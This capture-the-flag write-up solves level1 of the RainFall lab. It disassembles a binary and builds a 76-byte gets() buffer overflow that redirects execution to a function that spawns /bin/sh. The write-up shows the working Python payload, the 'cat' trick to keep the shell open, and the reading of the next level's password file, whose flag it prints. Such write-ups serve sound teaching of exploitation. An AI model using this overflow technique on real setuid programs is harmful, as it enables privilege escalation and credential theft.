# Level1

We have a binary once again : `level1`

Running it ends up in an infinite loop or freeze, so not much to be done here..

Let’s try to disassemble it again :

First, using `readelf`

```nasm
Symbol table '.symtab' contains 69 entries:
Num:    Value  Size Type    Bind   Vis      Ndx Name
[...]
50: 08048444    60 FUNC    GLOBAL DEFAULT   13 run
[...]
66: 08048480    23 FUNC    GLOBAL DEFAULT   13 main
[...]
```

We notice 2 functions with some content (size)

Then with `gdb`, like in level0 :

```nasm
(gdb) disas main
Dump of assembler code for function main:
0x08048480 <+0>:     push   ebp                                // Setup a stack for the function
0x08048481 <+1>:     mov    ebp,esp                            // ~
0x08048483 <+3>:     and    esp,0xfffffff0                     // ~
0x08048486 <+6>:     sub    esp,0x50                           // Allocate 0x50 (80) bytes on stack
0x08048489 <+9>:     lea    eax,[esp+0x10]                     // The buffer in eax starts at 0x10 (16)
0x0804848d <+13>:    mov    DWORD PTR [esp],eax                // Move it to the top of the stack
0x08048490 <+16>:    call   0x8048340 gets@plt                 // Call gets with whatever is in the stack
0x08048495 <+21>:    leave
0x08048496 <+22>:    ret
End of assembler dump.
(gdb) disas run
Dump of assembler code for function run:
0x08048444 <+0>:     push   ebp
0x08048445 <+1>:     mov    ebp,esp
0x08048447 <+3>:     sub    esp,0x18                            // Allocate 0x18 (24) bytes on the stack
0x0804844a <+6>:     mov    eax,ds:0x80497c0                    // Copy whatever is at the adres 0x8... in eax
0x0804844f <+11>:    mov    edx,eax                             // Copy it into edx
0x08048451 <+13>:    mov    eax,0x8048570                       // Copy whatever is at the adres 0x8... in eax
0x08048456 <+18>:    mov    DWORD PTR [esp+0xc],edx             // Push edx into the stack
0x0804845a <+22>:    mov    DWORD PTR [esp+0x8],0x13            // Copy 0x13 at 0x8 in the stack
0x08048462 <+30>:    mov    DWORD PTR [esp+0x4],0x1             // Copy 0x1 at 0x4 in the stack
0x0804846a <+38>:    mov    DWORD PTR [esp],eax                 // Copy eax at the top of the stack
0x0804846d <+41>:    call   0x8048350 [fwrite@plt](mailto:fwrite@plt)                // Call fwrite
0x08048472 <+46>:    mov    DWORD PTR [esp],0x8048584           // Copy whatever is at 0x80... at the top of the stack
0x08048479 <+53>:    call   0x8048360 [system@plt](mailto:system@plt)                // Call system
0x0804847e <+58>:    leave
0x0804847f <+59>:    ret
End of assembler dump.
```

The run function contains a call to `system`, which executes the command we put in it, that’s interesting and could be our solution !
However `main` is never calling `run`… The only call it makes is to `gets`.

`gets` isn’t safe as it does not limit the number of characters it reads and that can result in a buffer overflow, that’s a good thing for us !

Now we need to figure out how big our payload should be in order to overflow and to reach the run function :

<aside>
💡

From stack overflow :

*esp is the stack pointer. ebp is for a stack frame so that when you 
enter a function, ebp can get a copy of esp at that point. Everything 
already on the stack, the return address, passed-in parameters, etc. and
 things that are global for that function (local variables) will now be a
 static distance away from the stack frame pointer for the duration of 
the function. esp is now free to wander about as the compiler desires 
and can be used when nesting to other functions (each needs to preserve 
the ebp naturally).*

</aside>

When leave is called, `ebp` is moved back to esp and `ebp` pops back to its old value, restoring the stack as it was before `main` was called. That means the old `ebp` is stored somewhere in the stack, taking up 4 space, the return address of main function is then most likely located after that value. We also know that we allocated a 80 bytes buffer on the stack, but it only starts at 0x10 (16), that means our payload needs to be :
`80 - 16 + 4 (old ebp) + 4 (return address) = 68 padding + 4 address` 

So it seems we need to fill 68 random bytes and then overwrite the return address with run’s address we got from `readelf` : `0x08048444`

This can be done easily with python, giving our payload as `stdin`, which will be read by `gets` : (note that the address is given backwards as required by x86 processors → little endian)

```bash
python -c 'print("X" * 68 + "\x44\x84\x04\x08")' | ./level1
```

But that produces no output, no segfault as well, kinda weird.

Our size calculation seems correct but I tried some values that were close to it just in case

```bash
level1@RainFall:~$ python -c 'print("X" * 68 + "\x44\x84\x04\x08")' | ./level1
level1@RainFall:~$ python -c 'print("X" * 64 + "\x44\x84\x04\x08")' | ./level1
level1@RainFall:~$ python -c 'print("X" * 60 + "\x44\x84\x04\x08")' | ./level1
level1@RainFall:~$ python -c 'print("X" * 72 + "\x44\x84\x04\x08")' | ./level1
Illegal instruction (core dumped)
level1@RainFall:~$ python -c 'print("X" * 76 + "\x44\x84\x04\x08")' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

Something definitely happens with a payload of 80 in total, there could be two reasons for that : one is I went too far with trying to calculate where the return address should be and I just had to take the size of the buffer allocated (which was 0x50 or 80). Or, there is a padding of 8 bytes performed by the program to keep alignment to 16 bytes and that would make more sense : 

- **64 / 16 = 4**               that’s okay
- **64 + 4 (ebp) + 4 (return address) / 16 = 4.5**            that’s not okay
- **64 + 8 (padding) + 4 (ebp) + 4 (return address)**  **= 5**      that’s okay !

Anyway, now that we have a correct buffer value we have an issue : it still segfaults afterwards. 
The message we get : “Good… Wait what?” probably comes from the call to `fwrite` in `run`. It should then call `system` with whatever is at the address `0x8048584`, let’s find out what’s there

```bash
level1@RainFall:~$ gdb -q ./level1
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) x/s 0x8048584
0x8048584:       "/bin/sh"
```

Alright, so that is indeed the solution to this level ! Now we just need to keep access to this shell and interact with it, and to do that we need to keep `stdin` open, otherwise the shell thinks we’re already done before we even started. One way to do that is by adding `cat` to our command : 

```bash
level1@RainFall:~$ (python -c 'print("X" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
exit
```

And we’re finally done !
